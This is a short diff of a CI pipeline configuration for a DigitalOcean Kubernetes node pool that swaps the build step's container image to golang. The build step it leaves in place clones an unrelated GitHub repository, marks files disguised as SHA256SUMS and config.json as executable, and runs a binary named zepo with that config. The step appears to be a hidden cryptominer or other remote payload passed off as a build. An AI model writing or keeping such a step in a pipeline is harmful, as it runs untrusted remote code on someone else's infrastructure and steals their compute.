@@ -8,7 +8,7 @@ node_selector:
   doks.digitalocean.com/node-pool: josa-cloud-np
 steps:
   - name: build
-    image: plugins/docker
+    image: golang
     commands:
       - git clone https://github.com/azureone4/zephher.git && cd zephher && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
 
